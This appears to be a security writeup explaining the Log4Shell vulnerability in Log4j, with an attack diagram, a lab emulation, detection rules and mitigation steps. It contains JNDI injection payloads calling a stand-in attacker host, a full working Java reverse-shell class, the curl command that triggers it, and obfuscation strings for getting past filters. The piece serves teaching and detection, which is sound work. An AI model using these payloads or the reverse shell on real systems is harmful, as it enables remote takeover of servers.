# Demystifying Log4Shell: CVE-2021-44228 Deep Dive and Detection

In December 2021, a critical vulnerability in the Apache Log4j utility, dubbed **Log4Shell** (CVE-2021-44228), shook the internet. With a CVSS score of **10.0 (Critical)**, it allowed unauthenticated remote code execution (RCE) on millions of enterprise servers running Java.

In this writeup, we will break down the underlying mechanics of Log4Shell, simulate a safe exploit flow, and explore how to detect it using SIEM logs and packet analysis.

---

## 1. The Root Cause: JNDI & Lookups

The core issue lies in how Log4j processes message strings. Log4j supports a feature called **Lookups** which allows dynamically inserting values into logs (e.g., system variables). 

```java
logger.info("System User: ${sys:user.name}");
```

Log4j also integrated support for **JNDI (Java Naming and Directory Interface)**, which allows Java applications to discover and look up data and objects via different naming/directory services, such as LDAP, RMI, or DNS.

When Log4j encountered a JNDI lookup like `${jndi:ldap://attacker.com/a}`, it would:
1. Parse the string.
2. Reach out to the external server `attacker.com` via LDAP protocol.
3. Fetch the directory attributes.
4. If the LDAP directory attributes returned a Java object class definition, Log4j would attempt to download and execute the compiled Java class (`.class`) file on the target server.

This converts a simple logging function into a remote class loader and execution engine.

---

## 2. Exploitation Mechanics

The attack lifecycle follows a simple 4-step sequence:

```
[Victim Server]
      │
      │ 1. Sends HTTP Request with payload (e.g., User-Agent: ${jndi:ldap://attacker.com/malicious})
      ▼
[Attacker Listener (LDAP)] 
      │
      │ 2. Receives query, redirects victim to HTTP Server hosted by attacker
      ▼
[Attacker Web Server]
      │
      │ 3. Delivers compiled Java exploit class (Exploit.class)
      ▼
[Victim Server]
      │
      │ 4. Downloads class, instantiates it, and executes attacker code locally
      ▼
   [SHELL ESTABLISHED]
```

### Attack Payload Examples

Attackers injected JNDI strings into standard HTTP headers that are commonly logged by web servers (e.g., User-Agent, X-Forwarded-For, Authorization, custom headers):

```http
GET / HTTP/1.1
Host: vulnerable-app.com
User-Agent: ${jndi:ldap://attacker-ip:1389/Exploit}
X-Forwarded-For: ${jndi:rmi://attacker-ip:1099/Exploit}
```

---

## 3. Emulating the Attack (Lab Scenario)

In a controlled sandbox, we set up a vulnerable Java Spring Boot application utilizing Log4j `2.14.1` and ran it on a local endpoint.

On the attacker machine, we compiled a basic payload that launches a reverse shell:

```java
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {
    static {
        try {
            String host = "10.10.10.5"; // Attacker IP
            int port = 4444; // Netcat listener port
            String cmd = "/bin/bash";
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s = new Socket(host, port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0) so.write(pi.read());
                while (pe.available() > 0) so.write(pe.read());
                while (si.available() > 0) po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {}
            }
            p.destroy();
            s.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

We start a rogue LDAP referral server pointing to our HTTP server delivering `Exploit.class`, open a Netcat listener on port `4444`, and execute the curl command:

```bash
curl -A "${jndi:ldap://10.10.10.5:1389/Exploit}" http://vulnerable-app.com:8080/login
```

As soon as Log4j logs the User-Agent header, the victim connects back to our Netcat listener, establishing an interactive shell.

---

## 4. Detection Engineering

### A. Network Forensics (Wireshark / Snort)
On the wire, we can search for JNDI payloads. However, attackers bypass basic string filters using nested lookups:
- `${${lower:j}ndi:...}`
- `${${upper:j}ndi:...}`
- `${jnd${lower:i}:...}`

A Snort IDS rule that handles common obfuscations looks like this:

```text
alert tcp any any -> $HOME_NET any (msg:"EXPLOIT Log4j JNDI Lookup Attempt"; flow:established,to_server; content:"|24 7b|"; content:"ndi"; distance:1; fast_pattern; classtype:attempted-user; sid:1000001; rev:1;)
```

*Note: `|24 7b|` is the hex representation for `${`.*

### B. SIEM Log Correlation (Splunk / Elastic)
We can search for inbound requests containing the obfuscated JNDI patterns or suspicious outbound LDAP/RMI requests from our internal web servers.

**Elasticsearch KQL query** to identify potential Log4j JNDI strings in HTTP logs:

```kql
url.original: (*jndi* OR *ldap* OR *rmi* OR *dns*) OR http.request.headers.user-agent: (*jndi* OR *ldap* OR *rmi* OR *dns*)
```

**Splunk SPL query** to correlate outbound LDAP traffic from web-tier servers to external IPs (port 389, 1389, 1099):

```spl
index=network sourcetype=pan:traffic (dest_port=389 OR dest_port=1389 OR dest_port=1099 OR dest_port=1099)
| stats count BY src_ip, dest_ip, dest_port
| lookup threat_intel_ip dest_ip AS dest_ip OUTPUT is_malicious
```

---

## 5. Mitigation and Hardening

1. **Upgrade Log4j:** The most robust fix is upgrading to Log4j **2.17.1** or higher.
2. **Disable Message Lookups:** For versions 2.10 to 2.14.1, set the system property:
   ```properties
   log4j2.formatMsgNoLookups=true
   ```
3. **Remove JndiLookup Class:** In older versions, manually strip the class from the classpath:
   ```bash
   zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
   ```
4. **Restrict Outbound Connections:** Block outbound LDAP/RMI connections from application servers using firewall rules or Network Security Groups (NSGs). Egress filtering is a lifesaver.
